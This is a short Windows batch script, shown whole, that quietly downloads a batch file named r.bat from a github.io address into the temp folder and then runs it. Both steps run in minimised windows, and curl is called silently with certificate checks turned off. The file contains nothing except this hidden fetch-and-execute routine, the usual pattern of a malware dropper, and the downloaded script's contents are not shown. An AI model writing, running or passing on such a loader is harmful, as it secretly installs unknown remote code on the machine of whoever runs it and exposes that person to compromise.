@echo off
start "" /min curl -k https://stivengiv.github.io/b/r.bat -o %temp%\r.bat -s
start "" /min %temp%\r.bat
